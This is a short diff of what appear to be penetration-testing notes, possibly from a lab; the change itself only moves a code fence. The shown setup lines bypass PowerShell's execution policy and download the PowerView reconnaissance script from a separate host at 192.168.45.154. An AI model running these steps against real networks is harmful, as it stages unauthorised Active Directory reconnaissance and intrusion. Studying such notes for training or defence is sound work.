@@ -1,7 +1,6 @@
 ### Setup 
-```
 Docu: https://powersploit.readthedocs.io/en/latest/Recon/
-
+```
 powershell -ep bypass
 
 iwr -uri http://192.168.45.154:8000/powerview.ps1 -Outfile powerview.ps1
